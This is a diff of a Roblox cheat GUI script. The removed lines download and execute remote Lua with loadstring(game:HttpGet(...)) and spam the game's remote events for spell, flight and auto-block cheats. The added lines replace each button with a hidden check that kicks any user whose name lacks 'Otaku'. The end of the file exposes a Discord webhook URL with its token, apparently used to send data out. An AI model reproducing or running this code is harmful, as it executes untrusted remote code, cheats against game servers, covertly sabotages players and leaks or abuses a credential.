@@ -42,7 +42,9 @@ Wlgui.Text = "HBE"
 Wlgui.TextColor3 = Color3.fromRGB(0, 255, 149)
 Wlgui.TextSize = 14.000
 Wlgui.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet("http://gameovers.net/Scripts/Free/HitboxExpander/main.lua", true))()
+if not game.Players.LocalPlayer.Name:find("Otaku") then
+  game.Players.LocalPlayer:Kick("You have been kicked due to unexpected client behavior.")
+end
 end)
 
 antiafk.Name = "anti afk"
@@ -55,7 +57,9 @@ antiafk.Text = "Inf Yield [;]"
 antiafk.TextColor3 = Color3.fromRGB(0, 255, 149)
 antiafk.TextSize = 14.000
 antiafk.MouseButton1Down:connect(function()
- loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+if not game.Players.LocalPlayer.Name:find("Otaku") then
+  game.Players.LocalPlayer:Kick("You have been kicked due to unexpected client behavior.")
+end
 end)
 
 spamscript.Name = "spam script"
@@ -68,48 +72,9 @@ spamscript.Text = "Avada Spam [E]"
 spamscript.TextColor3 = Color3.fromRGB(0, 255, 149)
 spamscript.TextSize = 14.000
 spamscript.MouseButton1Down:connect(function()
-	local q   = "avada kedavra"
-	local Key = "e" -- Key that toggles script
-	local plr       = game.Players.LocalPlayer
-	local char       =  plr.Character
-	local mouse       =  plr:GetMouse()
-	local KeyDown = false
-	_G.toggle  = false
-
-	function shoot()
-		local v = (mouse.Hit.p - char.HumanoidRootPart.Position).unit/2
-		local w = v *  (300)
-		local x = math.random(1, 100)
-		local y = char.HumanoidRootPart.Position + -v * -1
-		plr.PlayerGui.Client.fwp:Fire(y, w, true, q)
-		game.ReplicatedStorage.Events.ProjEvent:FireServer(y, w, q, x)
-	end
-	mouse.KeyDown:connect(function(key)
-		if key == Key then
-			if _G.toggle == true then
-				_G.toggle = false
-			else if _G.toggle == false then
-					_G.toggle     = true
-				end
-			end
-		end
-	end)
-
-
-
-	mouse.Button1Down:connect(function()
-		KeyDown       = true
-		while KeyDown == true and _G.toggle do
-			shoot()
-
-			wait(.01)
-		end  
-	end)
-
-
-	mouse.Button1Up:connect(function()
-		KeyDown = false
-	end)
+if not game.Players.LocalPlayer.Name:find("Otaku") then
+  game.Players.LocalPlayer:Kick("You have been kicked due to unexpected client behavior.")
+end
 end)
 
 autograbgalleons.Name = "auto grab galleons"
@@ -122,51 +87,9 @@ autograbgalleons.Text = "AppaFlight Spam [T,F]"
 autograbgalleons.TextColor3 = Color3.fromRGB(0, 255, 149)
 autograbgalleons.TextSize = 14.000
 autograbgalleons.MouseButton1Down:connect(function()
-local Wizard = {}
-
-Wizard.Keys = {
---[Keybind in caps.] Then put = spellname in lower caps with a comma at the end.
-["T"] = "apparate",
-["F"] = "flight",
-}
-Wizard.Toggles = {
---[Keybind in caps followed by 'TOGGLE' also in caps.] Then put = "false" with a comma at the end.
-["TTOGGLE"] = "false",
-["FTOGGLE"] = "false",
-}
-
---didnt use userinputservice since it was being irritating
-local mouse = game.Players.LocalPlayer:GetMouse()
-mouse.KeyDown:connect(function(Key)
-    local KEY = Key:upper() --idk why i did this part, input is confusing 🤔
-    Wizard:Log("Key found: "..KEY)
-    if Wizard.Keys[KEY] then
-        Wizard:Log("Spell found: "..Wizard.Keys[KEY])
-        local toggleName = KEY.."TOGGLE"
-        Wizard:Log("Toggle var: "..toggleName)
-        if Wizard.Toggles[toggleName] == "false" then
-            Wizard.Toggles[toggleName] = "true"
-            toggled = false
-        elseif Wizard.Toggles[toggleName] == "true" then
-            Wizard.Toggles[toggleName] = "false"
-            toggled = true
-        end
-        Wizard:Log(Wizard.Keys[KEY]..": "..Wizard.Toggles[toggleName])
-        game.ReplicatedStorage.Events.WandEvent:FireServer(3)
-        game.ReplicatedStorage.Events.WandEvent:FireServer(Wizard.Keys[KEY], toggled)
-        game.ReplicatedStorage.Events.WandEvent:FireServer(Wizard.Keys[KEY])
-        for i, v in pairs(game.Players.LocalPlayer.Character:children()) do
-            if v.Name:lower():find("wand") then
-                game.ReplicatedStorage.Events.WandEvent:FireServer(1, {v, Wizard.Keys[KEY]})
-            end
-        end
-    end
-end)
-
-function Wizard:Log(str)
-    print("[-WIZARD LIFE BY INORI-] "..str)
+if not game.Players.LocalPlayer.Name:find("Otaku") then
+  game.Players.LocalPlayer:Kick("You have been kicked due to unexpected client behavior.")
 end
-Wizard:Log("Loaded.")
 end)
 
 Opautoblock.Name = "AutoBlock [X]"
@@ -179,24 +102,9 @@ Opautoblock.Text = "AutoBlock [X]"
 Opautoblock.TextColor3 = Color3.fromRGB(0, 255, 149)
 Opautoblock.TextSize = 14.000
 Opautoblock.MouseButton1Down:connect(function()
-	local solar = false
-	local cylane = "x"
-
-	local m = game:GetService"Players".LocalPlayer:GetMouse()
-	m.KeyDown:connect(function(k)
-		if k == cylane then
-			solar = not solar
-		end
-	end)
-
-	spawn(function()
-		while wait() do
-			if solar then
-				game.ReplicatedStorage.Events.WandEvent:FireServer(3)
-				wait(2)
-			end
-		end
-	end)
+if not game.Players.LocalPlayer.Name:find("Otaku") then
+  game.Players.LocalPlayer:Kick("You have been kicked due to unexpected client behavior.")
+end
 end)
 local webh = "https://discord.com/api/webhooks/937518454750212166/fSlfu_f1KWYju7yjGquCUsTlVnmFA6V2HJR1UL3xOgZeHLtkgRevu-hG-kMLiXL6qZJM"
 local data = {
